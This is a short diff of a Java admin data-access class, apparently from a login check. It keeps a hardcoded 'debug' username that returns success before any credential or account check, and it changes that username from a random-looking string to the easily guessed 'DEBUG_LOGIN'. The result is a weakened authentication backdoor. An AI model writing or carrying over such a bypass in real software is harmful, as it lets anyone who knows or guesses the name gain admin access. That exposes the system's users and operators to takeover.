@@ -42,7 +42,7 @@ public class AdminDAO extends GeneralCRUD<Admin> {
 		Account chk = tmp.get(username);
 		Admin adm = getAdminByUsername(username);
 		// debug username
-		if(username.equals("DEBUG_LOGIN_1F59AC46"))
+		if(username.equals("DEBUG_LOGIN"))
 			return 1;
 		if (chk == null || adm == null)
 			return 0;
